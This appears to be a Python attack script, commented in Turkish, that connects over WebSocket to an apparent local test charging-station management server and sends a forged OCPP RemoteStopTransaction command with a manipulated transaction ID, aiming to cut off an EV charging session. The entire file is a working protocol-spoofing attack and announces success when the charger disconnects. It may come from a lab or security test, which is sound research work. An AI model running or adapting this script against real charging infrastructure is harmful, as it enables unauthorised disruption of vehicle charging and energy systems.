import asyncio
import websockets
import json
import time

# Hedef: CSMS Sunucusunun adresi
SALDIRI_URL = "ws://127.0.0.1:8080/EVSE_MITM_TEST" 

async def attack():
    """Hedef EVSE'ye sahte RemoteStop komutunu gönderir."""
    print("--- Saldırgan Betigi Baslatiliyor ---")
    
    try:
        # Sunucuya bağlan (Saldırgan rolünde)
        async with websockets.connect(SALDIRI_URL) as websocket:
            print(f"Hedefe baglanti basarili: {SALDIRI_URL}")

            # RemoteStopTransaction Komutu (OCPP formatı)
            REMOTE_STOP_MSG = json.dumps([
                2,        # 2: Call (Bir eylem başlatma)
                "999",    # Benzersiz mesaj ID'si
                "RemoteStopTransaction", 
                {"transactionId": 12345} # Manipule edilen ID
            ])
            
            print("\n!!! SAHTE RemoteStopTransaction KOMUTU GONDERILIYOR !!!")
            await websocket.send(REMOTE_STOP_MSG)
            print("-> Komut gonderildi. EVSE'nin kesilmesi bekleniyor...")

            # Yanıtı bekle ve bağlantının kapanmasını gözlemle
            response = await asyncio.wait_for(websocket.recv(), timeout=2)
            print(f"<- Yanit alindi: {response}")

    except ConnectionRefusedError:
        print("HATA: CSMS Sunucusu calismiyor. Lütfen önce onu baslatin.")
    except asyncio.TimeoutError:
        print("[SALDIRI BAŞARILI] Komut gönderildi, ancak EVSE bağlantısı kesildiği için yanıt alınamadı.")
    except Exception as e:
        print(f"Beklenmedik hata: {e}")

if __name__ == "__main__":
    asyncio.run(attack())